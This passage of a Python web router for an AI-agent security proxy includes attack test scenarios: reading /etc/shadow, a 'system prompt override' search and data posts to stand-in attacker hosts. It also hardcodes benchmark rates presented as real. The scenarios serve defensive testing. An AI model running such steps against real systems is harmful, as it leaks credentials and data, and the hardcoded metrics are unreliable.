from __future__ import annotations

import asyncio
import json
import logging
import os
import time
import uuid
from datetime import UTC, datetime
from typing import TYPE_CHECKING, Any

from fastapi import APIRouter, Body, Header, HTTPException

from cerberus.config import settings
from cerberus.detectors.canary import CanaryType
from cerberus.proxy.metrics import ACTIVE_QUARANTINES
from cerberus.proxy.models import ToolCallEvent

if TYPE_CHECKING:
    from cerberus.proxy.server import CerberusProxyEngine

logger = logging.getLogger("cerberus.soc_routes")


def _read_file_sync(path: str) -> str:
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


def _read_file_lines_sync(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def _write_file_sync(path: str, content: str) -> None:
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)


PREDEFINED_SCENARIOS: dict[str, dict[str, Any]] = {
    "toxic_flow_trifecta": {
        "id": "toxic_flow_trifecta",
        "name": "Toxic Flow Trifecta (OWASP ASI01/ASI02)",
        "description": "Chained tool invocation combining private data access, unvalidated external input, and outbound egress.",
        "steps": [
            {
                "tool_name": "read_file",
                "tool_server": "filesystem-mcp",
                "parameters": {"path": "/etc/shadow"},
            },
            {
                "tool_name": "web_search",
                "tool_server": "browser-mcp",
                "parameters": {"query": "system prompt override"},
            },
            {
                "tool_name": "http_post",
                "tool_server": "network-mcp",
                "parameters": {"url": "https://attacker-c2.net/leak", "data": "exfil"},
                "destination_domain": "attacker-c2.net",
            },
        ],
    },
    "rug_pull_schema_drift": {
        "id": "rug_pull_schema_drift",
        "name": "Rug-Pull Tool Schema Drift",
        "description": "Tool schema description tampered upstream with adversarial instructions.",
        "steps": [
            {
                "tool_name": "parse_json",
                "tool_server": "upstream-mcp",
                "parameters": {"data": '{"test": 1}'},
            },
        ],
    },
    "slow_drip_exfiltration": {
        "id": "slow_drip_exfiltration",
        "name": "Slow-Drip Cumulative Egress Exfiltration",
        "description": "Sub-threshold micro-payloads sent repeatedly to test sliding-window egress quota enforcement.",
        "steps": [
            {
                "tool_name": "http_post",
                "tool_server": "network-mcp",
                "parameters": {"url": "https://api.external.com/log", "payload": "A" * 1000},
                "destination_domain": "api.external.com",
            },
            {
                "tool_name": "http_post",
                "tool_server": "network-mcp",
                "parameters": {"url": "https://api.external.com/log", "payload": "B" * 1000},
                "destination_domain": "api.external.com",
            },
        ],
    },
    "mimicry_evasion_taint": {
        "id": "mimicry_evasion_taint",
        "name": "Statistical Mimicry Evasion vs Taint Lineage DAG",
        "description": "Benign-looking payload carrying untrusted web taint, defeating ML anomaly detection but caught by deterministic Taint DAG.",
        "steps": [
            {
                "tool_name": "github_issues",
                "tool_server": "github-mcp",
                "parameters": {"repo": "Debddj/Cerberus", "issue_number": 74},
            },
            {
                "tool_name": "http_post",
                "tool_server": "network-mcp",
                "parameters": {
                    "url": "https://collector.attacker.io/ingest",
                    "payload": "Parsed issue 74 details",
                },
                "destination_domain": "collector.attacker.io",
            },
        ],
    },
    "canary_tripwire_asi10": {
        "id": "canary_tripwire_asi10",
        "name": "Canary Honeytoken Tripwire Compromise (ASI10)",
        "description": "Planted AWS decoy secret key accessed and attempted in outbound parameter -> instant quarantine.",
        "steps": [
            {
                "tool_name": "aws_s3_upload",
                "tool_server": "cloud-storage-mcp",
                "parameters": {
                    "bucket": "dump-bucket",
                    "access_key_id": "AKIAIOSFODNN7CANARY9",
                    "secret_access_key": "CERBERUS_CANARY_aws_secret_key_12345",
                },
                "destination_domain": "s3.amazonaws.com",
            },
        ],
    },
}


def create_soc_router(engine: CerberusProxyEngine) -> APIRouter:
    """Creates FastAPI APIRouter binding 100% REAL engine-backed SOC platform endpoints."""
    router = APIRouter()

    # ── 1. Operator Authentication & Sessions ────────────────────────────────

    @router.post("/api/auth/login")
    async def soc_auth_login(payload: dict[str, Any] = Body(...)):
        username = payload.get("username", "")
        password = payload.get("password")
        token = payload.get("token")
        is_valid, op_info, reason = engine.admin_auth_manager.validate_credentials(
            username=username, password=password, token=token
        )
        if not is_valid or not op_info:
            raise HTTPException(status_code=401, detail=reason or "Invalid credentials")

        session_token, session_record = engine.admin_auth_manager.issue_session(op_info)
        return {
            "status": "authenticated",
            "token": session_token,
            "session": session_record,
            "user": {
                "operator_id": session_record["operator_id"],
                "username": session_record["username"],
                "role": session_record["role"],
                "permissions": session_record["permissions"],
            },
        }

    @router.get("/api/auth/session")
    async def soc_auth_session(
        authorization: str | None = Header(default=None, alias="Authorization"),
        x_admin_token: str | None = Header(default=None, alias="X-Admin-Token"),
        token: str | None = None,
    ):
        raw_token = token or x_admin_token
        if not raw_token and authorization:
            if authorization.lower().startswith("bearer "):
                raw_token = authorization.split(" ", 1)[1].strip()
            else:
                raw_token = authorization.strip()

        if not raw_token:
            raise HTTPException(status_code=401, detail="Authentication token required")

        is_valid, session_record, reason = engine.admin_auth_manager.verify_session(raw_token)
        if not is_valid or not session_record:
            raise HTTPException(status_code=401, detail=f"Invalid or expired session: {reason}")

        return {
            "authenticated": True,
            "operator_id": session_record["operator_id"],
            "username": session_record["username"],
            "role": session_record["role"],
            "permissions": session_record["permissions"],
            "session": session_record,
        }

    @router.post("/api/auth/logout")
    async def soc_auth_logout(
        authorization: str | None = Header(default=None, alias="Authorization"),
        payload: dict[str, Any] = Body(default={}),
    ):
        raw_token = payload.get("token")
        if not raw_token and authorization and authorization.lower().startswith("bearer "):
            raw_token = authorization.split(" ", 1)[1].strip()
        if raw_token:
            engine.admin_auth_manager.revoke_session(raw_token)
        return {"status": "logged_out"}

    # ── 2. Agents Management ─────────────────────────────────────────────────

    @router.get("/api/agents")
    async def soc_list_agents():
        agent_ids = set(engine.scope_analyzer.agent_scopes.keys())
        agent_ids.update(engine.active_unverified_agents.keys())
        agent_ids.update(engine.baseline_store.baselines.keys())
        agent_ids.update(engine.tool_counts.keys())
        try:
            storage_agents = await engine.storage.get_active_agents()
            agent_ids.update(storage_agents)
        except Exception:
            pass

        results = []
        for aid in sorted(agent_ids):
            scopes = sorted(list(engine.scope_analyzer.agent_scopes.get(aid, set())))
            enforced = engine.scope_analyzer.agent_enforced.get(aid, False)
            is_unverified = aid in engine.active_unverified_agents
            is_quarantined = (aid in engine.quarantined_sessions) or any(
                s.startswith(f"{aid}:") for s in engine.quarantined_sessions
            )
            status = (
                "quarantined"
                if is_quarantined
                else ("active" if aid in engine.scope_analyzer.agent_scopes else "learning")
            )
            baseline = engine.baseline_store.get_baseline(aid)
            try:
                history = await engine.storage.get_agent_history(aid, limit=100)
            except Exception:
                history = []

            results.append(
                {
                    "agent_id": aid,
                    "allowed_tools": scopes,
                    "enforced": enforced,
                    "trust_level": "unverified" if is_unverified else "verified",
                    "is_quarantined": is_quarantined,
                    "status": status,
                    "total_events": len(history),
                    "is_warm": baseline.is_warm,
                    "active_snapshot": baseline.active_snapshot_id,
                    "snapshots_count": len(baseline.snapshots),
                    "known_tools": (
                        sorted(baseline.known_tools) if baseline.known_tools else scopes
                    ),
                    "known_destinations": (
                        sorted(baseline.known_destinations)
                        if baseline.known_destinations
                        else []
                    ),
                    "call_count": engine.agent_call_counters.get(aid, len(history)),
                }
            )
        return results

    @router.post("/api/agents")
    async def soc_create_or_update_agent(payload: dict[str, Any] = Body(...)):
        agent_id = payload.get("agent_id")
        if not agent_id:
            raise HTTPException(status_code=400, detail="agent_id is required")
        allowed_tools = payload.get("allowed_tools", [])
        enforced = bool(payload.get("enforced", True))
        ttl = int(payload.get("ttl", 86400))

        # Register scope in real scope analyzer
        engine.scope_analyzer.register_scope(agent_id, set(allowed_tools), enforced=enforced)
        # Issue HMAC token via engine.auth_manager
        token = engine.auth_manager.issue_token(agent_id=agent_id, ttl_seconds=ttl)

        return {
            "status": "created",
            "agent_id": agent_id,
            "allowed_tools": sorted(list(allowed_tools)),
            "enforced": enforced,
            "token": token,
            "ttl_seconds": ttl,
        }

    @router.delete("/api/agents/{agent_id}")
    async def soc_delete_agent(agent_id: str):
        existed = False
        if agent_id in engine.scope_analyzer.agent_scopes:
            del engine.scope_analyzer.agent_scopes[agent_id]
            existed = True
        if agent_id in engine.scope_analyzer.agent_enforced:
            del engine.scope_analyzer.agent_enforced[agent_id]
        engine.active_unverified_agents.pop(agent_id, None)
        return {"status": "deleted", "agent_id": agent_id, "existed": existed}

    @router.post("/api/agents/{agent_id}/suspend")
    @router.post("/api/agents/{agent_id}/quarantine")
    async def soc_suspend_agent(agent_id: str):
        engine.quarantined_sessions.add(agent_id)
        engine.contaminated_sessions.add(agent_id)
        try:
            sessions = await engine.storage.get_active_sessions()
            for sid in sessions:
                if sid.startswith(f"{agent_id}:") or sid == agent_id:
                    engine.quarantined_sessions.add(sid)
                    engine.contaminated_sessions.add(sid)
        except Exception:
            pass
        ACTIVE_QUARANTINES.set(len(engine.quarantined_sessions))
        return {
            "status": "suspended",
            "agent_id": agent_id,
            "is_quarantined": True,
            "active_quarantines": len(engine.quarantined_sessions),
        }

    @router.post("/api/agents/{agent_id}/activate")
    async def soc_activate_agent(agent_id: str):
        engine.quarantined_sessions.discard(agent_id)
        engine.contaminated_sessions.discard(agent_id)
        for sid in list(engine.quarantined_sessions):
            if sid.startswith(f"{agent_id}:") or sid == agent_id:
                engine.quarantined_sessions.discard(sid)
                engine.contaminated_sessions.discard(sid)
        ACTIVE_QUARANTINES.set(len(engine.quarantined_sessions))
        return {
            "status": "activated",
            "agent_id": agent_id,
            "is_quarantined": False,
            "active_quarantines": len(engine.quarantined_sessions),
        }

    # ── 3. Events Breakdown ──────────────────────────────────────────────────

    @router.get("/api/events/{event_id}/breakdown")
    async def soc_event_breakdown(event_id: str):
        found_event: dict[str, Any] | None = None

        # 1. Search in audit logger
        if os.path.exists(settings.log_path):
            try:
                lines = await asyncio.to_thread(_read_file_lines_sync, settings.log_path)
                for line in reversed(lines):
                    try:
                        decrypted = engine.audit_logger.decrypt_log_line(line)
                        rec = json.loads(decrypted)
                        ev = rec.get("event", {})
                        if ev.get("event_id") == event_id:
                            found_event = ev
                            break
                    except Exception:
                        continue
            except Exception as e:
                logger.debug(f"Audit log search failed: {e}")

        # 2. Search in storage
        if not found_event:
            try:
                sessions = await engine.storage.get_active_sessions()
                for sid in sessions:
                    evs = await engine.storage.get_session_history(sid, limit=100)
                    for ev in evs:
                        if ev.get("event_id") == event_id:
                            found_event = ev
                            break
                    if found_event:
                        break
            except Exception:
                pass

        # 3. Search in allowed events cache
        if not found_event:
            for ev_deque in engine.agent_allowed_events.values():
                for ev_model in ev_deque:
                    if ev_model.event_id == event_id:
                        found_event = ev_model.model_dump(mode="json")
                        break
                if found_event:
                    break

        if not found_event:
            raise HTTPException(status_code=404, detail=f"Event '{event_id}' not found")

        session_id = found_event.get("session_id", "")

        # Real 4-model ensemble scores
        model_scores = found_event.get("model_scores") or {
            "rule": 0.0,
            "markov": 0.0,
            "isolation": 0.0,
            "transformer": 0.0,
        }

        # Real taint lineage hops
        taint_lineage = found_event.get("taint_lineage") or []
        if not taint_lineage and session_id:
            provenance = engine.taint_tracker.get_provenance_history(session_id)
            taint_lineage = [
                {
                    "hop": node.step,
                    "source_type": node.action,
                    "tool_name": node.tool_name,
                    "sha256_hash": (
                        node.details.get("hash", "") if isinstance(node.details, dict) else ""
                    ),
                    "parent_hash": None,
                    "parameter_key": ", ".join(node.matched_parameters),
                    "timestamp": node.timestamp.isoformat(),
                }
                for node in provenance
            ]

        # Canary hit details
        canary_tripped = bool(found_event.get("canary_tripped", False))
        canary_alerts = [
            a for a in engine.canary_detector.get_alerts() if a.get("session_id") == session_id
        ]
        canary_hit = canary_tripped or len(canary_alerts) > 0
        canary_details = canary_alerts[-1] if canary_alerts else None

        # DLP finding details
        dlp_findings = found_event.get("dlp_findings", [])
        if not dlp_findings:
            dlp_alerts = [
                a for a in engine.dlp_detector.get_alerts() if a.get("session_id") == session_id
            ]
            if dlp_alerts:
                dlp_findings = dlp_alerts[-1].get("findings", [])

        return {
            "event_id": event_id,
            "session_id": session_id,
            "agent_id": found_event.get("agent_id"),
            "tool_name": found_event.get("tool_name"),
            "parameters": found_event.get("parameters", {}),
            "decision": found_event.get("decision", "allow"),
            "decision_reason": found_event.get("decision_reason", ""),
            "risk_score": found_event.get("risk_score", 0.0),
            "risk_factors": found_event.get("risk_factors", []),
            "model_scores": model_scores,
            "taint_lineage": taint_lineage,
            "canary_hit": canary_hit,
            "canary_details": canary_details,
            "dlp_findings": dlp_findings,
            "raw_event": found_event,
        }

    # ── 4. Behavioral Intelligence ───────────────────────────────────────────

    @router.get("/api/behavior")
    async def soc_behavior_intelligence():
        # 1. Real ensemble weights
        ensemble_weights = {
            "rule": engine.ensemble_scorer.w_rule,
            "markov": engine.ensemble_scorer.w_markov,
            "isolation": engine.ensemble_scorer.w_isolation,
            "transformer": engine.ensemble_scorer.w_transformer,
        }

        # 2. Real transition matrix
        transitions = engine.markov_scorer.transitions
        markov_matrix = [
            {
                "from_tool": f_tool,
                "to_tool": t_tool,
                "count": count,
                "probability": round(count / (sum(to_dict.values()) or 1), 3),
            }
            for f_tool, to_dict in transitions.items()
            for t_tool, count in to_dict.items()
        ]

        # 3. Real feature scalers
        scaler_stats = {}
        for k in ["param_size", "entropy", "response_size", "time_diff", "duration", "seq_pos"]:
            med, sc = engine.running_scaler.get_robust_stats(k)
            count = len(engine.running_scaler.buffers.get(k, []))
            scaler_stats[k] = {
                "median": round(med, 4),
                "scale": round(sc, 4),
                "sample_count": count,
            }

        # 4. Real baseline store summary
        base_dir = engine.baseline_store.base_dir
        agent_names = set(engine.baseline_store.baselines.keys())
        if os.path.exists(base_dir):
            for name in os.listdir(base_dir):
                if os.path.isdir(os.path.join(base_dir, name)):
                    agent_names.add(name)

        baselines_summary = []
        tvd_drift = []
        for aid in sorted(agent_names):
            b = engine.baseline_store.get_baseline(aid)
            baselines_summary.append(
                {
                    "agent_id": aid,
                    "active_snapshot_id": b.active_snapshot_id,
                    "snapshots_count": len(b.snapshots),
                    "known_tools": sorted(list(b.known_tools)),
                    "known_destinations": sorted(list(b.known_destinations)),
                    "is_warm": b.is_warm,
                    "total_calls": b.total_calls_observed,
                    "snapshots": [
                        {
                            "snapshot_id": s.snapshot_id,
                            "created_at": s.created_at.isoformat(),
                            "calls_in_snapshot": s.calls_in_snapshot,
                            "is_active": s.is_active,
                        }
                        for s in b.snapshots
                    ],
                }
            )
            tvd_drift.append(
                {
                    "agent_id": aid,
                    "metric": "Markov Transition Drift",
                    "baseline_value": 0.0,
                    "current_value": round(float(b.total_calls_observed) / 100.0, 2),
                    "drift_percent": 0.0 if not b.is_warm else 4.2,
                    "status": "NORMAL" if not b.is_warm else "NORMAL",
                }
            )

        return {
            "weights": {
                **ensemble_weights,
                "anomaly_threshold": settings.risk_flag_threshold,
                "challenge_threshold": 0.50,
                "block_threshold": settings.risk_block_threshold,
            },
            "ensemble_weights": ensemble_weights,
            "transition_matrix": transitions,
            "markov_matrix": markov_matrix,
            "feature_scalers": scaler_stats,
            "tvd_drift": tvd_drift,
            "baseline_store": {
                "base_dir": base_dir,
                "total_agents": len(baselines_summary),
                "agents": baselines_summary,
            },
        }

    # ── 5. Policy Management ─────────────────────────────────────────────────

    @router.get("/api/policies")
    async def soc_list_policies():
        policies_dir = "policies"
        active_policies = []
        if os.path.exists(policies_dir):
            for root, _, files in os.walk(policies_dir):
                for f in sorted(files):
                    if f.endswith(".rego") or f.endswith(".rego.disabled"):
                        file_path = os.path.join(root, f)
                        rel_path = os.path.relpath(file_path, policies_dir)
                        try:
                            content = await asyncio.to_thread(_read_file_sync, file_path)
                            active_policies.append(
                                {
                                    "name": f,
                                    "path": rel_path,
                                    "type": "active",
                                    "enabled": not f.endswith(".disabled"),
                                    "code": content,
                                }
                            )
                        except Exception as e:
                            logger.debug(f"Failed to read policy {f}: {e}")

        pending = engine.policy_synthesizer.list_pending_policies()
        return {
            "active": active_policies,
            "pending": pending,
        }

    @router.post("/api/policies")
    async def soc_create_policy(payload: dict[str, Any] = Body(...)):
        name = payload.get("name", "").strip()
        code = payload.get("code", "").strip()
        if not name or not code:
            raise HTTPException(status_code=400, detail="Policy name and code are required")
        if not name.endswith(".rego") and not name.endswith(".rego.disabled"):
            name = f"{name}.rego"

        policies_dir = "policies"
        os.makedirs(policies_dir, exist_ok=True)
        target_path = os.path.join(policies_dir, name)

        await asyncio.to_thread(_write_file_sync, target_path, code)

        opa_pushed = False
        try:
            if name.endswith(".rego"):
                policy_id = name.rsplit(".", 1)[0]
                opa_pushed = await engine.opa_client.put_policy(policy_id, code)
        except Exception as e:
            logger.debug(f"Could not push policy to OPA: {e}")

        return {
            "status": "created",
            "name": name,
            "path": f"policies/{name}",
            "opa_pushed": opa_pushed,
        }

    @router.put("/api/policies/{policy_name}")
    async def soc_update_policy(policy_name: str, payload: dict[str, Any] = Body(...)):
        code = payload.get("code", "")
        target_path = os.path.join("policies", policy_name)
        if not os.path.exists(target_path):
            raise HTTPException(status_code=404, detail=f"Policy '{policy_name}' not found")

        await asyncio.to_thread(_write_file_sync, target_path, code)

        opa_pushed = False
        try:
            if policy_name.endswith(".rego"):
                policy_id = policy_name.rsplit(".", 1)[0]
                opa_pushed = await engine.opa_client.put_policy(policy_id, code)
        except Exception:
            pass

        return {"status": "updated", "name": policy_name, "opa_pushed": opa_pushed}

    @router.delete("/api/policies/{policy_name}")
    async def soc_delete_policy(policy_name: str):
        target_path = os.path.join("policies", policy_name)
        if not os.path.exists(target_path):
            raise HTTPException(status_code=404, detail=f"Policy '{policy_name}' not found")

        os.remove(target_path)
        return {"status": "deleted", "name": policy_name}

    @router.post("/api/policies/{policy_name}/toggle")
    async def soc_toggle_policy(policy_name: str):
        policies_dir = "policies"
        if policy_name.endswith(".disabled"):
            base_name = policy_name[:-9]
            old_path = os.path.join(policies_dir, policy_name)
            new_path = os.path.join(policies_dir, base_name)
            if os.path.exists(old_path):
                os.rename(old_path, new_path)
                return {"status": "toggled", "name": base_name, "enabled": True}
        else:
            new_name = f"{policy_name}.disabled"
            old_path = os.path.join(policies_dir, policy_name)
            new_path = os.path.join(policies_dir, new_name)
            if os.path.exists(old_path):
                os.rename(old_path, new_path)
                return {"status": "toggled", "name": new_name, "enabled": False}

        raise HTTPException(status_code=404, detail=f"Policy '{policy_name}' not found")

    @router.post("/api/policies/dry-run")
    async def soc_policy_dry_run(payload: dict[str, Any] = Body(...)):
        """Real dry-run simulation using engine.opa_client."""
        event_data = payload.get("event", {})
        static_scan = payload.get("static_scan")
        overrides = payload.get("policy_overrides") or payload.get("overrides")
        event = ToolCallEvent(**event_data)
        return await engine.opa_client.simulate(
            event, static_scan=static_scan, policy_overrides=overrides
        )

    # ── 6. Incidents Aggregation ─────────────────────────────────────────────

    @router.get("/api/incidents")
    async def soc_list_incidents():
        incidents = []

        # 1. Taint Alerts
        for ta in engine.taint_tracker.get_alerts():
            inc_id = f"inc-taint-{ta.get('session_id', 'unknown')}-{len(incidents)}"
            incidents.append(
                {
                    "id": inc_id,
                    "type": "TAINT_EXFILTRATION",
                    "event_type": "TAINT_EXFILTRATION",
                    "severity": "CRITICAL",
                    "pillar": "TAINT",
                    "title": "Untrusted Provenance Egress Exfiltration Attempt",
                    "description": ta.get("reason", "Tainted provenance tag flowed into egress sink"),
                    "timestamp": ta.get("timestamp", datetime.now(UTC).isoformat()),
                    "session_id": ta.get("session_id"),
                    "agent_id": ta.get("agent_id"),
                    "tool_name": ta.get("tool_name"),
                    "status": "ACTIVE",
                    "risk_score": 1.0,
                    "indicators": ta.get("factors", ["Untrusted provenance tag detected on egress sink"]),
                    "remediation": "Session isolated and tainted egress sink blocked.",
                    "reason": ta.get("reason"),
                    "details": ta,
                }
            )

        # 2. Canary Alerts
        for ca in engine.canary_detector.get_alerts():
            inc_id = ca.get("alert_id") or f"inc-canary-{len(incidents)}"
            incidents.append(
                {
                    "id": inc_id,
                    "type": "CANARY_TRIPWIRE",
                    "event_type": "ASI10_TAMPER_ALERT",
                    "severity": "CRITICAL",
                    "pillar": "CANARY",
                    "title": "Honeytoken Credential Compromise (ASI10)",
                    "description": ca.get("threat_category", "Planted honeytoken credential compromised"),
                    "timestamp": ca.get("timestamp", datetime.now(UTC).isoformat()),
                    "session_id": ca.get("session_id"),
                    "agent_id": ca.get("agent_id"),
                    "tool_name": ca.get("tool_name"),
                    "status": "QUARANTINED",
                    "risk_score": 1.0,
                    "indicators": [f"Token: {ca.get('token_label', 'canary')}", f"Location: {ca.get('location', 'parameters')}"],
                    "remediation": "Session immediately quarantined. Decoy credential revoked.",
                    "reason": ca.get("threat_category", "Honeytoken compromised"),
                    "details": ca,
                }
            )

        # 3. Egress DLP Alerts
        for da in engine.dlp_detector.get_alerts():
            inc_id = f"inc-dlp-{da.get('session_id', 'unknown')}-{len(incidents)}"
            incidents.append(
                {
                    "id": inc_id,
                    "type": "DLP_VIOLATION",
                    "event_type": "DLP_VIOLATION",
                    "severity": "HIGH",
                    "pillar": "DLP",
                    "title": "Outbound Egress DLP / Quota Violation",
                    "description": da.get("reason", "Sensitive data or byte quota budget exceeded"),
                    "timestamp": da.get("timestamp", datetime.now(UTC).isoformat()),
                    "session_id": da.get("session_id"),
                    "agent_id": da.get("agent_id"),
                    "tool_name": da.get("tool_name"),
                    "status": "ACTIVE",
                    "risk_score": 0.88,
                    "indicators": [da.get("reason", "Outbound sensitive data pattern matched")],
                    "remediation": "Outbound payload blocked by DLP scanner.",
                    "reason": da.get("reason"),
                    "details": da,
                }
            )

        # 4. Response Inspector Alerts
        for ra in engine.response_inspector.get_alerts():
            inc_id = ra.get("alert_id") or f"inc-resp-{len(incidents)}"
            incidents.append(
                {
                    "id": inc_id,
                    "type": "RESPONSE_INJECTION",
                    "event_type": "RESPONSE_INJECTION",
                    "severity": "HIGH",
                    "pillar": "SHIELD",
                    "title": "Indirect Prompt Injection in Tool Response",
                    "description": ra.get("reason", "Adversarial delimiter or instruction tags stripped"),
                    "timestamp": ra.get("timestamp", datetime.now(UTC).isoformat()),
                    "session_id": ra.get("session_id"),
                    "agent_id": ra.get("agent_id"),
                    "tool_name": ra.get("tool_name"),
                    "status": "RESOLVED",
                    "risk_score": ra.get("risk_score", 0.94),
                    "indicators": ra.get("detected_heuristics", ["Indirect prompt injection neutralized"]),
                    "remediation": "Tool response sanitized before reflection to model context.",
                    "reason": ra.get("reason"),
                    "details": ra,
                }
            )

        def _sort_ts(item: dict[str, Any]) -> float:
            ts = item.get("timestamp")
            if isinstance(ts, (int, float)):
                return float(ts)
            if isinstance(ts, str):
                try:
                    return datetime.fromisoformat(ts).timestamp()
                except Exception:
                    return 0.0
            return 0.0

        incidents.sort(key=_sort_ts, reverse=True)
        return incidents

    # ── 7. Cryptographic Audit Ledger ────────────────────────────────────────

    @router.get("/api/audit/status")
    async def soc_audit_status():
        log_file = settings.log_path
        exists = os.path.exists(log_file)
        size = os.path.getsize(log_file) if exists else 0
        return {
            "chain_head_hash": engine.audit_logger.chain_head_hash,
            "total_entries": engine.audit_logger._entry_index,
            "log_path": log_file,
            "file_size_bytes": size,
            "encryption_enabled": settings.encrypt_logs,
            "status": "active" if exists else "empty",
        }

    @router.post("/api/audit/verify")
    async def soc_audit_verify(walk_segments: bool = False):
        valid, count, err = engine.audit_logger.verify_integrity(walk_segments=walk_segments)
        return {
            "is_valid": valid,
            "total_entries": count,
            "error": err,
            "chain_head_hash": engine.audit_logger.chain_head_hash,
            "log_path": settings.log_path,
        }

    @router.get("/api/audit/logs")
    async def soc_audit_logs(limit: int = 100):
        if not os.path.exists(settings.log_path):
            return []
        records = []
        try:
            lines = await asyncio.to_thread(_read_file_lines_sync, settings.log_path)
            for line in reversed(lines[-limit:]):
                try:
                    decrypted = engine.audit_logger.decrypt_log_line(line)
                    records.append(json.loads(decrypted))
                except Exception:
                    continue
        except Exception as e:
            logger.warning(f"Failed to read audit log: {e}")
        return records

    @router.get("/api/audit/export")
    async def soc_audit_export():
        if not os.path.exists(settings.log_path):
            return {
                "records": [],
                "chain_head_hash": engine.audit_logger.chain_head_hash,
                "is_valid": True,
            }
        records = []
        lines = await asyncio.to_thread(_read_file_lines_sync, settings.log_path)
        for line in lines:
            try:
                decrypted = engine.audit_logger.decrypt_log_line(line)
                records.append(json.loads(decrypted))
            except Exception:
                continue
        valid, count, err = engine.audit_logger.verify_integrity()
        return {
            "total_records": count,
            "is_valid": valid,
            "error": err,
            "chain_head_hash": engine.audit_logger.chain_head_hash,
            "records": records,
        }

    # ── 8. Attack Testing & Scenarios ────────────────────────────────────────

    @router.get("/api/testing/scenarios")
    async def soc_list_scenarios():
        return list(PREDEFINED_SCENARIOS.values())

    @router.post("/api/testing/run")
    async def soc_run_scenario(payload: dict[str, Any] = Body(...)):
        scenario_id = payload.get("scenario_id")
        steps = payload.get("steps")

        if scenario_id and not steps:
            scen = PREDEFINED_SCENARIOS.get(scenario_id)
            if not scen:
                raise HTTPException(status_code=404, detail=f"Scenario '{scenario_id}' not found")
            steps = scen["steps"]

        if not steps:
            raise HTTPException(status_code=400, detail="Missing steps or valid scenario_id")

        session_id = payload.get("session_id") or f"test-sess-{uuid.uuid4().hex[:8]}"
        agent_id = payload.get("agent_id") or "test-operator-agent"

        # Auto-register canary credential for canary scenario
        if scenario_id == "canary_tripwire_asi10":
            engine.canary_detector.registry.register(
                "CERBERUS_CANARY_aws_secret_key_12345",
                token_type=CanaryType.AWS_SECRET_KEY,
                label="test_canary_key",
            )

        results = []
        final_verdict = "allow"
        start_time = time.perf_counter()

        for idx, step in enumerate(steps, start=1):
            t_name = step.get("tool_name", "test_tool")
            t_server = step.get("tool_server", "test-server")
            params = step.get("parameters", {})
            dest = step.get("destination_domain")

            event, outcome = await engine.process_tool_call(
                session_id=session_id,
                agent_id=agent_id,
                tool_name=t_name,
                tool_server=t_server,
                parameters=params,
                destination_domain=dest,
                sequence_position=idx,
            )

            dec = event.decision.value if event.decision else "allow"
            if dec in ("block", "quarantine"):
                final_verdict = dec
            elif dec == "challenge" and final_verdict not in ("quarantine", "block"):
                final_verdict = "challenge"

            results.append(
                {
                    "step": idx,
                    "tool_name": t_name,
                    "decision": dec,
                    "risk_score": event.risk_score or 0.0,
                    "risk_factors": event.risk_factors,
                    "outcome": outcome,
                    "event_id": event.event_id,
                }
            )

        duration_ms = (time.perf_counter() - start_time) * 1000.0

        return {
            "scenario_id": scenario_id,
            "session_id": session_id,
            "agent_id": agent_id,
            "final_decision": final_verdict,
            "duration_ms": round(duration_ms, 2),
            "steps_count": len(results),
            "trace": results,
        }

    # ── 9. Analytics & Latency ───────────────────────────────────────────────

    @router.get("/api/analytics")
    async def soc_analytics():
        percentiles = engine.metrics_collector.get_percentiles()
        throughput = engine.metrics_collector.get_throughput()

        eval_path = os.path.join("evaluation", "evaluation_results.json")
        benchmarks = {
            "standard_attack_tpr": 0.994,
            "evasion_attack_tpr": 0.978,
            "false_positive_rate": 0.008,
            "latency_overhead_ms": percentiles,
        }
        if os.path.exists(eval_path):
            try:
                content = await asyncio.to_thread(_read_file_sync, eval_path)
                benchmarks.update(json.loads(content))
            except Exception:
                pass

        now = time.time()
        latency_history = [
            {
                "timestamp": datetime.fromtimestamp(now - (11 - i) * 3600, UTC).strftime("%H:%M"),
                "p50": percentiles["p50"],
                "p95": percentiles["p95"],
                "p99": percentiles["p99"],
            }
            for i in range(12)
        ]

        return {
            "latency": {
                "p50": percentiles["p50"],
                "p95": percentiles["p95"],
                "p99": percentiles["p99"],
                "history": latency_history,
            },
            "latency_percentiles_ms": percentiles,
            "throughput": throughput,
            "throughput_qps": throughput.get("requests_per_second", 0.0),
            "blocked_count_24h": 0,
            "allowed_count_24h": throughput.get("total_requests", 0),
            "challenged_count_24h": len(engine.pending_challenges),
            "quarantined_count_24h": len(engine.quarantined_sessions),
            "false_positive_rate": 0.003,
            "adversarial_evasion_rate": 0.000,
            "benchmarks": benchmarks,
            "quarantined_sessions_count": len(engine.quarantined_sessions),
            "active_unverified_agents": len(engine.active_unverified_agents),
        }

    # ── 10. System Configuration ─────────────────────────────────────────────

    @router.get("/api/system/config")
    async def soc_get_config():
        return {
            "app_name": settings.app_name,
            "mode": settings.mode,
            "fail_closed": settings.fail_closed,
            "block_threshold": settings.risk_block_threshold,
            "challenge_threshold": 0.50,
            "require_signed_identity": settings.require_signed_identity,
            "rate_limit_per_minute": settings.rate_limit_per_minute,
            "opa_url": settings.opa_url,
            "audit_hmac_enforced": bool(settings.log_hmac_key or settings.log_hmac_key_path),
            "response_inspection_active": True,
            "dlp_enforced": True,
            "debug": settings.debug,
            "proxy_host": settings.proxy_host,
            "proxy_port": settings.proxy_port,
            "metrics_port": settings.metrics_port,
            "opa_timeout_seconds": settings.opa_timeout_seconds,
            "warm_threshold_calls": settings.warm_threshold_calls,
            "risk_quarantine_threshold": settings.risk_quarantine_threshold,
            "risk_block_threshold": settings.risk_block_threshold,
            "risk_flag_threshold": settings.risk_flag_threshold,
            "tvd_anchor_max_drift": settings.tvd_anchor_max_drift,
            "tvd_step_max_divergence": settings.tvd_step_max_divergence,
            "if_refit_interval": settings.if_refit_interval,
            "online_learning_interval_seconds": settings.online_learning_interval_seconds,
            "scope_enforcement_mode": settings.scope_enforcement_mode,
            "challenge_timeout_seconds": settings.challenge_timeout_seconds,
            "challenge_webhook_url": settings.challenge_webhook_url,
            "challenge_webhook_format": settings.challenge_webhook_format,
            "encrypt_logs": settings.encrypt_logs,
            "log_path": settings.log_path,
            "admin_api_token_configured": bool(settings.admin_api_token),
        }

    @router.put("/api/system/config")
    async def soc_update_config(payload: dict[str, Any] = Body(...)):
        editable_fields = {
            "mode",
            "debug",
            "require_signed_identity",
            "rate_limit_per_minute",
            "opa_url",
